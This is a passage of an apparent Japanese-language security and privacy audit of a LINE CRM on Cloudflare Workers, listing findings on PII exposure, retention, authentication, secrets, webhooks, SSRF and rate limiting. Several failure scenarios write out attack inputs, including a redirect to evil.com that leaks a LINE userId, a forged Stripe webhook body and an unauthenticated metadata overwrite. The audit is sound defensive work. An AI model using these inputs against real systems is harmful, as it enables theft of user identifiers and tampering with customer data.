- **推奨**: 少なくとも channel_access_token / channel_secret / login_channel_secret / google refresh_token / webhook secret はアプリ層で封筒暗号化 (Workers Secret 由来 KEK で AES-GCM 等) して at-rest 平文を排除する。移行が重い場合でも、まず Google refresh_token と channel_secret を優先。復号は送信・webhook 検証の直前に限定し、API レスポンスへは決して復号値を載せない (finding 2 参照)。

### 31. GET /api/users がロール制限なしで全ユーザの email/phone を無ページングで返す + 突合オラクル
- `pii-at-rest` ・ 判定 `CONFIRMED` ・ `apps/worker/src/routes/users.ts:33`
- **内容**: GET /api/users (users.ts:31-39) は getUsers → `SELECT * FROM users ORDER BY created_at DESC`(packages/db/src/users.ts:56-61) で全件を取得し serializeUser(18-28) で email/phone を含めて返す。requireRole が無く authMiddleware のみのため staff ロールや共有 env API_KEY で全 PII をダンプ可能、かつページング・上限が無い。POST /api/users/match (152-172) は email/phone を投げると存在有無を返す列挙オラクルにもなる。line-accounts が staff にシークレットを伏せる(finding 2)のと対照的に、users は staff に PII フル開示で最小権限が破れている。
- **失敗シナリオ**: 権限の低い staff トークン(または漏れた共有 API_KEY)1本で GET /api/users を叩くと、登録済み全ユーザの email と phone が一括で抜ける。/api/users/match に候補メールを総当たりすれば、特定人物がこの CRM に登録されているかを確認できる。
- **推奨**: GET /api/users と /match を owner/admin 限定にし、staff からは email/phone をマスクまたは除外する。getUsers に limit/offset を導入して全件ダンプを不可にする。/match はレート制限強化と、ヒット有無だけでなく最小限の返却に絞る。

### 32. GET /api/friends が line_user_id を含む全プロフィール PII を、アカウントスコープ任意・ロール制限なしで返す
- `pii-at-rest` ・ 判定 `CONFIRMED` ・ `apps/worker/src/routes/friends.ts:36`
- **内容**: serializeFriend (friends.ts:29-44) は lineUserId(=push 可能な安定識別子)・displayName・pictureUrl・statusMessage を常に返す。list (83) の lineAccountId フィルタは任意で、省略すると全アカウント横断で friends 全件が返る。requireRole も無い(authMiddleware のみ)。オートコンプリート用途(includeTags=false)でも lineUserId は落とされず、id/displayName/picture しか要らない画面にも line_user_id が渡る。staff は line_account にひも付いていない(Env.Variables.staff は {id,name,role} のみ)ため、アカウント単位の認可がそもそも掛けられない構造。
- **失敗シナリオ**: staff トークン1本で GET /api/friends?limit=1000 (lineAccountId 省略) を叩くと、全アカウントの友だちの line_user_id + 表示名 + ステータスメッセージが横断で抜ける。line_user_id が漏れれば、別途 channel_access_token(finding 1/2)と組み合わせて任意ユーザへ直接 push する経路が成立する。オートコンプリート API 経由でも同識別子が広く配布される。
- **推奨**: 一覧/詳細を owner/admin 限定にするか、少なくともオートコンプリート経路では lineUserId/statusMessage を serializer から除外する(必要な画面のみ opt-in)。将来的には staff に line_account スコープを持たせ、friends クエリを所属アカウントに強制フィルタする。lineAccountId 未指定時に全件横断を許すデフォルトを見直す。

### 33. 友だちの display_name(氏名/表示名 PII)が follow ごとに console.log でログ出力される
- `pii-in-logs` ・ 判定 `CONFIRMED` ・ `apps/worker/src/routes/webhook.ts:204`
- **内容**: follow イベント処理で `console.log(`[follow] profile=${profile?.displayName ?? 'null'}`)` が実行され、LINE から取得した友だちの表示名(display_name)が平文で Cloudflare Workers のログに出力される。display_name はスキーマ上 PII として明示されている列。単一 D1 に全テナント相乗りの構成のため、wrangler tail / Logpush を閲覧できる運用者は全テナントの新規友だちの氏名を横断的に閲覧できる。デバッグ用途と思われるログが本番コードに残存している。
- **失敗シナリオ**: 任意のエンドユーザが LINE 公式アカウントを友だち追加する→getProfile が成功→line 204 で `[follow] profile=<実名/表示名>` がログに書き込まれる。Logpush が有効なら R2/外部 SIEM に PII が永続化され、tail 権限を持つ全オペレータ(他テナント含む)がその氏名を取得できる。
- **推奨**: display_name をログに出さない。デバッグが必要なら friend.id(内部 UUID)のみに置換する。line 204 のログは削除、もしくは開発時のみ有効な debug ロガー(本番で no-op)へ移す。

### 34. QRプロキシが第三者(api.qrserver.com)に uid/IGSID/@username 等の識別子をクエリ文字列で送信(コメントは逆の主張)
- `pii-in-transit` ・ 判定 `CONFIRMED` ・ `apps/worker/src/index.ts:219`
- **内容**: /api/qr は data クエリを受け取り、そのまま https://api.qrserver.com/v1/create-qr-code/?...&data=<encoded> へ fetch する外部プロキシ。data には呼び出し側が組み立てた LIFF ディープリンクがそのまま入り、liff.ts:604 の qrUrl は uid(内部ユーザーUUID)・ig(Instagram IGSID)・iga・igan(IG @username)・xh・gate を含み、index.ts:434(/r/:ref の PC 用QR)の liffTarget も ig/iga/igan/xh/gate を含む。これらの識別子(特に IGSID はプラットフォーム横断で個人を紐付ける安定識別子、uid は内部ユーザーUUID)が、契約もDPAも無い無料公開QRサービス(api.qrserver.com=第三者)へクエリ文字列で送られ、当該第三者のアクセスログに残る。index.ts:214 のコメントは『Self-hosted QR code proxy — prevents leaking ref tokens to third-party services』と明記しているが、実装は逆で、サーバ側で識別子ごと第三者へ転送している。xh:プレフィックスの ref は externalRef=''で除外されているが、別物の ?xh= クエリ(gate検証トークン)は qrParams/liffParams にそのまま載って転送される。auth middleware(auth.ts:181)で /api/qr は無認証公開のため、data ホストのallowlistも無く任意データの中継にもなる。
- **失敗シナリオ**: IG Harness 経由の導線 https://<worker>/auth/line?ig=<IGSID>&uid=<victimのユーザーUUID>&igan=@handle を PC ブラウザで開く → PC分岐で QRページを返し qrUrl に uid/ig/igan が焼き込まれる → ページが <img src="/api/qr?...data=<qrUrlをencode>"> をロード → worker が api.qrserver.com へ GET し、IGSID・内部ユーザーUUID・IG @username が第三者のサーバログに平文で記録される。/r/:ref?ig=...&igan=... の PC アクセスでも同様(index.ts:434)。
- **推奨**: (1) QR を worker 内で自前生成する(WASM/純JSのQRエンコーダをバンドルし PNG/SVG を返す)か、少なくとも外部送信するのは短命な短縮トークンだけにして uid/ig/iga/igan/xh/gate 等の識別子を data に含めない。(2) コメントの誤り(『第三者に漏らさない』)を実態に合わせて訂正。(3) やむを得ず外部プロキシを残す場合は data の中身を検証し LIFF ディープリンク以外・識別子含有を拒否、かつ /api/qr にホストallowlistと入力検証を追加。

### 35. 友だちの物理削除経路が全く存在せず「忘れられる権利」に応えられない（PII 無期限保持）
- `pii-retention-deletion` ・ 判定 `CONFIRMED` ・ `apps/worker/src/routes/webhook.ts:373`
- **内容**: friends の PII（line_user_id, display_name, picture_url, status_message, および email/phone/フォーム回答を含みうる metadata、messages_log の会話本文）を削除する経路がコードベースのどこにも存在しない。webhook の unfollow は updateFriendFollowStatus(db, userId, false)（packages/db/src/friends.ts:194-207）で is_following=0 の論理削除にするのみ。packages/db/src/friends.ts に deleteFriend 関数は無く、apps/worker/src/routes/friends.ts の DELETE は :id/tags/:tagId（line 459）だけで DELETE /api/friends/:id が無い。MCP の manage-friends.ts も count/set_metadata/set_rich_menu/remove_rich_menu のみで削除 action を持たない。ADR 0011/0013 は unfollow=論理削除を『再フォロー時のデータ保持が狙い』と明記するが、恒久退会者や削除要求に対する消去手段が一切無い点は別問題として残る。
- **失敗シナリオ**: 友だちが自分のデータ削除（忘れられる権利）を要求。運用者は friends 行を削除する API も DB 関数も持たず、line_user_id・表示名・プロフィール画像 URL・ステータスメッセージ・metadata・messages_log の incoming 会話本文が全て D1 に無期限で残存する。unfollow を待っても is_following=0 になるだけで PII は消えない。
- **推奨**: friends の物理削除（子テーブルは既存の ON DELETE CASCADE を活用しつつ、RESTRICT な bookings/event_bookings=migration 036/037 も明示処理）を行う deleteFriend(db, id) を実装し、認証付き DELETE /api/friends/:id を追加する。恒久消去が難しい場合でも、少なくとも PII 列を匿名化する scrub 経路を用意し、保持期間を定義する。

### 36. ADR 0008 で文書化された保持ポリシー（messages_log 90日等）が一切強制されておらずパージ Cron が存在しない
- `pii-retention-deletion` ・ 判定 `CONFIRMED` ・ `apps/worker/src/index.ts:917`
- **内容**: .agents/decisions/0008-data-model-and-schema-conventions.md:24 は messages_log>90d / friend_scores>180d / account_health_logs>30d / automation_logs>60d の定期パージを保持ポリシーとして明記している（『運用推奨』表現）。しかし scheduled Cron ハンドラ（index.ts の recover/token refresh/booking reminders/step・broadcast 配信/health/insight/booking expirer 一式）には該当パージが一つも無く、grep でも messages_log / friend_scores に対する DELETE・purge は 0 件。schema.sql:190 に idx_messages_log_created_at はあるが刈り取りに使われていない。結果、incoming メッセージ本文（PII）を含む messages_log が無期限に増え続ける。
- **失敗シナリオ**: 運用を続けると messages_log に顧客との incoming 会話本文（PII）が何年も蓄積し、90 日超の行を削除する処理が一度も走らない。D1 が無制限に肥大化し、かつ保持ポリシーに反して PII が長期残存する。account_health_logs / automation_logs / friend_scores も同様。
- **推奨**: 0 */6 の Cron tick に created_at インデックスを使ったパージジョブ（例: DELETE FROM messages_log WHERE created_at < :cutoff をバッチ削除）を追加し、ADR 0008 の日数を設定値として実装する。強制しないなら ADR 側の status/表現を実態に合わせて更新する。

### 37. deleteUser が友だちの PII を消さず friends.user_id を孤児化する（見かけ上の消去・クロスアカウント紐付け残存）
- `pii-retention-deletion` ・ 判定 `CONFIRMED` ・ `packages/db/src/users.ts:126`
- **内容**: deleteUser は `DELETE FROM users WHERE id = ?` を実行するだけ（apps/worker/src/routes/users.ts:103-111 が DELETE /api/users/:id で公開）。friends.user_id は migration 001_round2.sql:5 で `ALTER TABLE friends ADD COLUMN user_id TEXT` として FK も ON DELETE も無い素の列として追加されているため、user 削除後も friends.user_id は消えた UUID を指し続ける（孤児参照）。conversion_events.user_id（schema.sql:279）も素の列で同様。さらに linkFriendToUser で束ねた friend 群の line_user_id/display_name/picture_url/status_message/metadata は一切消えない。cross-account push（webhook.ts:556）や getMergedMetadataByUserId（friends.ts:210）は依然その stale user_id で GROUP 化する。
- **失敗シナリオ**: 運用者が消去要求対応として users レコード（横断 UUID）を削除。users 行の email/phone/display_name は消えるが、紐付く全 friend 行の LINE 側 PII は残存し、friends.user_id は削除済み UUID を指したまま孤児化する。実質的に消去できておらず、横断紐付けの痕跡も残る。
- **推奨**: user 削除をトランザクション化し、紐付く friends が存在する間は削除を拒否する、もしくは friends.user_id（および conversion_events.user_id 等の派生列）を NULL 化する。紐付く friend PII 自体を消すべきかの方針を決めて明文化し、deleteUser の消去範囲を実態に合わせる。

### 38. ログアウトがセッション/APIキーを失効させない(Cookie 値=永続 API キー、サーバ側セッションストア無し)
- `sec-authn-authz` ・ 判定 `CONFIRMED` ・ `apps/worker/src/routes/admin-auth.ts:57`
- **内容**: セッション Cookie の値はランダムな不透明トークンではなく、ログイン時に入力された API キーそのもの(auth.ts:67 adminSessionCookie(token,...) で token=apiKey)。サーバ側セッションテーブルは無く、認証は毎回 getStaffByApiKey / env API_KEY 照合で解決される。POST /api/auth/logout(admin-auth.ts:57-62)は expiredCookie を Set-Cookie するだけで、キー自体は無効化しない。そのため一度漏洩した Cookie 値(=有効な API キー)は、ユーザーがログアウトしても、また『セッション』満了(Max-Age 7日)後も、キーを再生成するまで永続的に有効。env API_KEY でログインした owner セッションは個別失効手段が無く、再生成には Secret 差し替え/再デプロイが必要。
- **失敗シナリオ**: 共有端末や侵害済みブラウザで owner がログイン→ログアウト。expiredCookie で表示上はログアウトするが、その前にプロキシログ/拡張/中間者等で Cookie 値(=API キー)を採取していた攻撃者は、ログアウト後も同じ値を lh_admin_session Cookie もしくは Authorization: Bearer に載せて全 API に owner として無期限アクセスできる。管理者側にはセッションを個別に kill する手段がなく、staff は regenerate-key、env-owner は Secret 再デプロイまで遮断不能。
- **推奨**: セッションは API キーそのものではなく、サーバ側で管理・失効可能な不透明セッショントークン(セッションテーブル+有効期限+revoked フラグ)に分離する。最低限、ログアウト時にサーバ側セッションを失効させ、キー漏洩時に個別セッションを無効化できる経路を用意する。API キー(SDK/MCP 用 Bearer)とブラウザセッションの資格情報を分けることで、片方の失効がもう片方に波及しない設計にする。

### 39. オープンリダイレクトで LINE userId(PII)を攻撃者ドメインへ流出
- `sec-injection` ・ 判定 `CONFIRMED` ・ `apps/worker/src/client/main.ts:294`
- **内容**: safeRedirectTarget(apps/worker/src/lib/safe-redirect.ts:59)は denylist 方針で、危険スキーム/プロトコル相対/制御文字のみ拒否し任意の外部 http(s) ホストを許可する(docstring 上は業務LP誘導のため意図的)。しかしクライアントの redirect フロー(main.ts:286-298)は redirectUrl が部分文字列 '/t/' を含むと 292-294 行で ${redirectUrl}${sep}lu=${encodeURIComponent(profile.userId)} へ遷移し、被害者の LINE userId(PII: friends.line_user_id、本システムの identity_key の一つ)をクエリに付与する。redirect は同一オリジン検証をしていないため、外部ホストでも '/t/' を含めれば userId が付与され送信される。
- **失敗シナリオ**: 攻撃者が被害者に https://liff.line.me/<liffId>?redirect=https://evil.com/t/ を開かせる。safeRedirectTarget は https の任意ホストを許可し通過→'/t/' を含むため main.ts:294 が https://evil.com/t/?lu=<被害者のLINE userId> へ遷移し、userId が攻撃者ドメインに漏洩(なりすまし/名寄せ/アトリビューション汚染に悪用可能)。
- **推奨**: userId(lu=)の付与は redirect 先が同一オリジン(または first-party allowlist ホスト)のときのみに限定する。識別子を伴うフローでは safeRedirectTarget を same-origin/allowlist 制限版に切り替え、外部リダイレクトには userId を付けない。

### 40. Worker ADMIN_API_KEY は NEXT_PUBLIC_ADMIN_API_KEY 経由で公開 JS バンドルに焼き込まれ、自動アップデート機構を第三者が乗っ取れる
- `sec-secrets` ・ 判定 `CONFIRMED` ・ `apps/web/src/lib/update-client.ts:43`
- **内容**: update-client.ts:42-46 の adminKey() は process.env.NEXT_PUBLIC_ADMIN_API_KEY を読み、update-client.ts:74/91 で `/admin/update/start` `/admin/update/status` に `x-admin-api-key` ヘッダとして送る。updates/page.tsx:8/31 も同じ値で `/admin/update/history` を叩く。Next.js は全 NEXT_PUBLIC_* をビルド時にクライアント JS へインライン展開するため、この変数を設定すると Worker 側の秘密 ADMIN_API_KEY が *.pages.dev 上の静的 JS に平文で焼き込まれ、誰でも view-source / バンドル取得で抽出できる。update-button.tsx:19 が startUpdate() を UI ボタンに配線しており(progress-modal.tsx:58 も getUpdateStatus を使用)、ダッシュボード内の自動アップデート UI を機能させるには運用者が NEXT_PUBLIC_ADMIN_API_KEY を設定せざるを得ない設計になっている(未設定だと update-client.ts:44 が throw、updates/page.tsx:42 は 'unconfigured' 表示)。この鍵は worker 側 admin-update.ts:107-113 で `/admin/update/*` 全体を守る唯一の認証で、通れば runUpdate が CF_API_TOKEN(サーバ側)を用いて Worker+Admin Pages+LIFF の全スタックを再デプロイする(admin-update.ts:130-225)。なお deploy-admin.ts:83 は『API key is entered via login page (never embedded in client bundle)』と明記し API URL のみ書き込む。deploy-cloudflare-admin.yml のビルド env も NEXT_PUBLIC_API_URL のみで NEXT_PUBLIC_ADMIN_API_KEY を設定しない。つまり設計意図は『埋め込まない』なのに更新 UI コードが真逆を要求する矛盾があり、updates/page.tsx:6-7 のコメント『create-line-harness セットアップでのみ設定される』も実際には create-line-harness が一切設定しないため誤り。
- **失敗シナリオ**: 運用者がダッシュボードの自動アップデート/履歴 UI を動かすため NEXT_PUBLIC_ADMIN_API_KEY=<worker の ADMIN_API_KEY> をビルド env に設定→pnpm --filter web build で admin バンドルに平文インライン→*.pages.dev で静的配信。攻撃者が公開 JS を取得し鍵を抽出→`POST https://<worker>/admin/update/start` に `x-admin-api-key: <抽出鍵>` を付与して呼ぶ→認証通過し全スタック(worker/admin/liff)強制再デプロイ・ダウンタイム誘発、`/admin/update/history` からバージョン/タイムスタンプ情報も窃取。
- **推奨**: サーバ秘密をクライアント公開変数に載せる設計をやめる。(1) update-client.ts / updates/page.tsx / update-button.tsx / progress-modal.tsx から NEXT_PUBLIC_ADMIN_API_KEY 参照を削除し、admin 認証は既存の HttpOnly セッション Cookie(ADMIN_ORIGIN + credentialed CORS)に統一。(2) worker 側 admin-update.ts:107-113 の認証を x-admin-api-key からセッション Cookie / staff ロール検証に切り替える(update-client.ts:106-113 の Phase 6 KNOWN LIMITATION でも同方針が示唆済み)。(3) 過渡期として鍵ヘッダを残す場合でも、ブラウザからは送らずサーバ間(create-line-harness update.ts のような CLI)のみに限定する。(4) updates/page.tsx:6-7 の誤ったコメントを修正する。

### 41. Stripe webhook が STRIPE_WEBHOOK_SECRET 未設定時に無検証フェイルオープン
- `sec-public-webhooks` ・ 判定 `CONFIRMED` ・ `apps/worker/src/routes/stripe.ts:100`
- **内容**: stripe.ts:90-103、STRIPE_WEBHOOK_SECRET が未設定だと署名検証を丸ごとスキップし任意ボディを受理する(『開発環境向け』コメント)。当エンドポイントは auth.ts:174 で無認証。攻撃者が payment_intent.succeeded を偽装し metadata.line_friend_id を任意友だちに設定すると applyScoring・purchased_ タグ付与・cv_fire イベント発火(stripe.ts:128-149)が起き、cv_fire はオートメーション fan-out(メッセージ送信含む)に波及し得る。
- **失敗シナリオ**: シークレット未設定のデプロイで POST /api/integrations/stripe/webhook {id:'evt_x', type:'payment_intent.succeeded', data:{object:{metadata:{line_friend_id:'<id>', product_id:'p'}}}} → 対象友だちのスコア加算・タグ付与・CV自動化が任意に発火。
- **推奨**: 本番でシークレット未設定なら fail-closed(503/401)にする。開発用フォールバックは明示的な DEV フラグでのみ許可し、既定では常に署名検証を要求する。

### 42. /api/liff/profile が無検証で友だちPII・内部識別子(user_id/friendId)を返すオラクル
- `sec-public-webhooks` ・ 判定 `CONFIRMED` ・ `apps/worker/src/routes/liff.ts:1232`
- **内容**: liff.ts:1232-1257、公開(auth.ts:168 の /api/liff/ 配下)かつ id_token 検証なしで body.lineUserId を受け、friend.id・display_name・is_following・内部 user_id を返す。display_name はプロジェクト定義上のPII。加えて lineUserId→friendId/user_id 変換オラクルとなり、friendId をキーにした攻撃(forms submit/partial、/t の f=)やアカウント横断相関を成立させる。
- **失敗シナリオ**: POST /api/liff/profile {lineUserId:'<被害者>'} → {id:'<friendId>', displayName:'実名', userId:'<crm uuid>'}。攻撃者はフォーム詐称に使う friendId と表示名を取得。
- **推奨**: id_token 検証を必須化し verified.sub == lineUserId を確認。最小限のフィールドのみ返し、内部 user_id / friendId は本人検証済みの場合に限る。

### 43. フォーム送信webhookのSSRF(スキーム/宛先未検証・レスポンス反射)
- `sec-public-webhooks` ・ 判定 `CONFIRMED` ・ `apps/worker/src/routes/forms.ts:661`
- **内容**: callFormWebhook(forms.ts:635-677)は form.on_submit_webhook_url をそのまま fetch する。webhooks.ts:27-41 の validateHttpsUrl のような https/宛先検証が無く、http:// や内部ホスト名も可。{placeholder} は送信値で置換され(forms.ts:644-646)、応答 body は submit レスポンス(forms.ts:387 webhookData)として呼び出し元へ反射される。所見#1(無認証 PUT)で URL を攻撃者が設定でき、公開 submit で発火できる。
- **失敗シナリオ**: 攻撃者が PUT /api/forms/<id> で onSubmitWebhookUrl='http://internal-svc.local/…' を設定 → POST /submit で Worker が内部URLを取得し、その本文が submit 応答(webhookData)として返る。内部サービスの探索・データ持ち出しに悪用。
- **推奨**: outgoing webhook と同様に URL を https 限定+宛先の妥当性検証(内部/ループバック/リンクローカル拒否)し、webhook 応答本文をクライアントへ反射しない。設定はサーバ検証済みの認証済み経路のみで許可する。

### 44. 公開 POST /api/forms/:id/partial が任意友だちのメタデータを無認証で上書き（クロスアカウント改竄）
- `sec-tenant-isolation` ・ 判定 `CONFIRMED` ・ `apps/worker/src/routes/forms.ts:265`
- **内容**: POST /api/forms/:id/partial は auth.ts:178 で無認証公開。ハンドラ（forms.ts:265-293）はクライアント指定の friendId/lineUserId から友だちを解決（getFriendById / getFriendByLineUserId=friends.ts、いずれも line_account_id 非スコープ）し、任意の `body.data` を friend.metadata に merge して UPDATE する。id_token 検証は無く（booking/events の LIFF は verifyCallerLineUserId を実施するのと対照的）、フォームが属するアカウントや友だちの所属アカウントとの一致確認も無い。
- **失敗シナリオ**: 攻撃者が漏えいした被害者の lineUserId（/t?lu= リンク・webhook・提出データ等から露見しうる）を用い `POST /api/forms/<任意formId>/partial` に `{"lineUserId":"U...","data":{"score":"999","segment":"vip"}}` を送ると、forms.ts:284-286 が本人確認なしに当該友だちの metadata に任意キーをマージ。friend 解決がアカウント非依存のため、別アカウントの友だちのメタデータも書換可能。metadata はスコアリング/セグメント/オートメーション条件（friends.ts の json_extract フィルタ）を駆動するため、配信対象やスコアを不正操作できる。
- **推奨**: partial/submit/opened も LIFF id_token 検証（verifyCallerLineUserId）を必須化し、検証済み sub とアカウント（liffId 由来 or form の line_account_id）で friend を解決する。少なくとも friendId/lineUserId 指定を排し、id_token の sub から friends(line_user_id, line_account_id) を引く。

### 45. In-memory rate limiter is per-isolate and provides no real global throttling (DoS 防御不足)
- `x-config-dos` ・ 判定 `CONFIRMED` ・ `apps/worker/src/middleware/rate-limit.ts:21`
- **内容**: レート制限は module-level の `const store = new Map()`(21行目)だけで管理され、AUTHENTICATED_MAX=1000 / UNAUTHENTICATED_MAX=100 / IP_CEILING_MAX=3000(108-121行目)を判定する。Cloudflare Workers は世界中の colo で多数の isolate を同時起動し、それぞれが独立した `store` を持つ。isolate 間で共有・同期される counter は無いため、実効上限は『上限 × 稼働 isolate 数』にスケールし、負荷が上がるほど事実上無制限になる。コメント(1-8行目)は cold start での counter 消失のみ言及し、この水平分散の無効化には触れていない。webhook / form submit などの未認証エンドポイントや、token ローテーション濫用を止めるはずの IP ceiling も、分散/並行アクセスでは素通りする。加えて `store` にサイズ上限が無く prune は 60 秒間隔(23-24行目)なので、16文字 token prefix や IPv6 を回すと 60 秒間 Map が膨張し isolate メモリを圧迫する副次経路もある。
- **失敗シナリオ**: 攻撃者が /webhook もしくは /api/forms/:id/submit へ 100req/min を大きく超える署名/送信を並行して投げると、各リクエストが別 isolate に分散するため 429 がほとんど返らず、後段の waitUntil 非同期処理・D1 書き込みが飽和する。Bearer token を毎回変えても per-token バケットが isolate ごとに別集計され、IP ceiling も同様に isolate 分だけ緩むため実質バイパスできる。
- **推奨**: 真に絞りたいエンドポイント(webhook / form submit / auth login)は Cloudflare の Rate Limiting rules もしくは Durable Object / KV ベースの共有カウンタに移行する。この in-memory 実装は best-effort のバースト緩和に過ぎない旨をコメントに明記し、単独の防御線として依存しない。`store` に最大エントリ数の上限を設ける。

### 46. scheduled ハンドラが全アカウントに O(N) でファンアウトし、1k サブリクエスト上限で cron が途中打ち切りになる
- `x-config-dos` ・ 判定 `CONFIRMED` ・ `apps/worker/src/index.ts:841`
- **内容**: scheduled()(index.ts:835-961)は getLineAccounts(841)で全アカウントを取得し、アカウントごとに LineClient を生成(845-849)、refreshLineAccessTokens(873)・processInsightFetch(921, lineClients マップ経由でアカウント別 LINE API 呼び出し)・checkAccountHealth(915)・各種配信を 1 invocation 内で実行する。Cloudflare Workers は 1 リクエスト(scheduled 含む)あたり最大 1000 サブリクエストで、D1 クエリと LINE API fetch がこれにカウントされる。テナント(line_accounts)数 N が増えると token refresh・insight・health だけで O(N) のサブリクエストを消費し、配信件数と合算して 1000 を超えると invocation が『Too many subrequests』で例外終了する。953-960 行のコメント自身が『1k-subrequest budget can't drain a 1k+ candidate backlog』と上限到達を認めている。アカウントをティック間で分割するカーソル/バッチが無いため、上限到達時は後段ジョブ(insight・expirer)と後半アカウントの配信が丸ごと落ちる。
- **失敗シナリオ**: テナント数が数百規模になった本番で、5分 cron の 1 tick が token refresh + insight + health のループ途中で 1000 サブリクエストに達し例外終了。以降の processInsightFetch / booking-expirer / 後半アカウントのリマインド配信が実行されず、リマインド送り漏れ(index.ts:865-870 が過去に起きたと記録する事故)が再発する。
- **推奨**: アカウント処理をティック間で回すカーソル/バッチ(1 tick あたり上限件数)を導入するか、per-account を Queue / Durable Object の個別 invocation に分割してサブリクエスト予算を invocation ごとに独立させる。1 invocation のサブリクエスト概算を CI で監視する。

## ⚪ LOW

- **POST /api/chats/:id/send: 未対応 messageType が送信されず『成功』ログ・in_progress 化 (送信事故)** — `apps/worker/src/routes/chats.ts:583` (`bug-core-routes`, CONFIRMED)
  - messageType は無検証(581行既定 'text')で、583-598行は text/flex/image のみ分岐。それ以外(例 'video','sticker','audio' やタイポ)はどの分岐にも入らず LINE への push が一切行われない。にもかかわらず 601-605行で messages_log に outgoing として記録し、608行で chat を in_progress に更新、610行で `{sent:true}` を返す。
  - 推奨: messageType を許可リスト(text/flex/image)で検証し、未知の値は 400 を返す。少なくとも else 分岐で送信していないことを検知してエラーにし、送信できた場合のみログ+ステータス更新する。
- **POST/PUT /api/templates: flex の JSON 検証が無く不正 flex を永続化 → 送信時に破綻** — `apps/worker/src/routes/templates.ts:135` (`bug-core-routes`, CONFIRMED)
  - POST(121-133行)は必須項目のみ、PUT(135-150行)は `updateTemplate(db, id, body)` に生 body を素通し。message-templates.ts が flex の `JSON.parse` 検証を行う(105-111行)のと異なり、templates 側は messageType='flex' でも messageContent の JSON 妥当性を一切検証しない。packages/db/src/templates.ts:34/54 も検証せず bind するだけなので、壊れた flex 文字列がそのまま保存される。テンプレートは auto_replies / scenario_steps から参照され送信に使われる。
  - 推奨: message-templates.ts と同じく、effectiveType='flex' のとき messageContent を `JSON.parse` で検証し不正なら 400。POST/PUT 双方に適用。
- **PUT /api/account-settings/test-recipients: try/catch 無し・friendIds 未検証で undefined bind → 500** — `apps/worker/src/routes/account-settings.ts:43` (`bug-core-routes`, CONFIRMED)
  - 42-58行のハンドラは try/catch を持たず、accountId のみ検証し friendIds は無検証。friendIds 欠落時 `JSON.stringify(body.friendIds)` は文字列 'undefined' でなく JS の undefined を返し(55行および DO UPDATE 側でも bind)、D1 は undefined bind を拒否して 500。`c.req.json()`(43行)も .catch 無しで不正 body なら throw。GET 側 21行 `JSON.parse(row.value)` も無防備で、破損値なら 500。
  - 推奨: ハンドラ全体を try/catch で包む。`Array.isArray(body.friendIds)` を検証し、非配列/欠落は `[]` にフォールバックまたは 400。GET の JSON.parse も失敗時 `[]` にフォールバック。
- **POST /api/friends/:id/messages: ログ記録が変換後(tracked)でなく元 content/type — 履歴が実送信と乖離** — `apps/worker/src/routes/friends.ts:601` (`bug-core-routes`, PLAUSIBLE)
  - 594行で実際に送るのは autoTrackContent 変換後の `tracked.messageType`/`tracked.content`(URL を含む text は flex ボタンに変換され得る)。しかし 601-605行の messages_log INSERT は元の `messageType`(570行)と `body.content` を記録する。結果、実際に flex を送っても履歴上は text の生 URL として残り、追跡リンク焼き込み(590行 appendFriendToTrackedLinks)後の内容とも一致しない。
  - 推奨: ログには実送信した `tracked.messageType` と `tracked.content` を記録する(整合性を最優先。表示用に元文を別途保持したい場合は別カラム/metadata へ)。
- **POST /api/friends/:id/score: scoreChange の数値検証が無く非数値でスコア破損・偽の 201** — `apps/worker/src/routes/scoring.ts:125` (`bug-core-routes`, CONFIRMED)
  - 125行は `body.scoreChange === undefined` のみ検証。文字列や null など非数値が通過し addScore(126行→packages/db/src/scoring.ts:76-81)に渡る。friend_scores.score_change に非数値が保存され、キャッシュ更新 `score = score + ?` は SQLite の文字列→数値強制(非数値は 0 扱い)で無変化になり得るのに、127-128行は 201 と currentScore を返す。
  - 推奨: `typeof body.scoreChange === 'number' && Number.isFinite(body.scoreChange)` を検証し、満たさなければ 400 を返す。
- **step 配信は送信直後にステップ完了マーカーを持たず、pushMessage と advanceFriendScenario の間でクラッシュすると 5 分後の recover で同一ステップが再送される** — `apps/worker/src/services/step-delivery.ts:252` (`bug-delivery-cron`, CONFIRMED)
  - processSingleDelivery は claimFriendScenarioForDelivery で status='delivering' に claim するが、current_step_order は据え置きのまま pushMessage (252) → messages_log INSERT → advanceFriendScenario/completeFriendScenario (273/276) の順で進む。pushMessage 成功後・advance 前にランタイムが強制終了すると、行は current_step_order 未更新の 'delivering' で残る。recoverStuckDeliveries (scenarios.ts:488-499) は updated_at が5分より古い 'delivering' を 'active' に戻すため、次 tick で同じ currentStep(step_order>current_step_order の最初)が再選択され再送される。送信自体に冪等キー(送信済みステップの永続記録)が無い。
  - 推奨: 送信直前または直後に (friend_scenario_id, step_order) 単位の送信済みレコードを INSERT OR IGNORE し、claim 時にそれをチェックする冪等化を導入する。あるいは advance を送信と同一 db.batch(トランザクション)で確定させ、送信後クラッシュ時の再送窓を最小化する。
- **insight-fetcher の日次スロットルがモジュールグローバル変数依存で、Worker の isolate リサイクル/並列 isolate では実質無効化され重複 fetch する** — `apps/worker/src/services/insight-fetcher.ts:11` (`bug-delivery-cron`, CONFIRMED)
  - processInsightFetch は `let lastInsightRun = 0`(モジュールグローバル)で『24時間に1回』を判定する (11,19-21)。Cloudflare Workers ではモジュールグローバルは isolate 単位・寿命限定で、isolate がリサイクルされると 0 に戻り、複数 isolate は各自の値を持つ。6時間 cron 重複窓では2並列 invocation が別 isolate で走り両方が閾値を通過し得る。結果としてスロットルは信頼できず、getPendingInsights が返す限り毎 tick / 並列に LINE Insight API を叩き subrequest と API コールを重複消費する(dedup 分岐は account_ids ループで getLineAccountById+getUnitInsight を多数発行)。
  - 推奨: スロットルを DB 側(例: 直近 fetched_at やジョブ実行記録テーブル)で判定し、getPendingInsights のクエリ条件に『前回取得から24時間経過 or 未取得』を含める。モジュールグローバルによる throttle は撤去するか、あくまで best-effort と明記する。
- **Manual tag add is non-idempotent: tag_change fires on every call even when the tag already exists, re-running automations and duplicating sends** — `apps/worker/src/routes/friends.ts:449` (`bug-crm-automation`, CONFIRMED)
  - POST /api/friends/:id/tags calls addTagToFriend (tags.ts:53, INSERT OR IGNORE) which discards the changes count, then unconditionally fireEvent('tag_change') at friends.ts:449. Unlike attachTagAndFireSideEffects (friend-tag-attach.ts:25) which gates side effects on `result.meta.changes > 0`, the manual route re-fires tag_change on every request even when the tag was already present. The friend-tag-attach.ts header comment (lines 10-12) explicitly notes this route is not idempotent for tag_change.
  - 推奨: Have the manual route also check the INSERT OR IGNORE changes count (or route through attachTagAndFireSideEffects) and only fire tag_change when the tag was newly added, matching the auto path's idempotency.
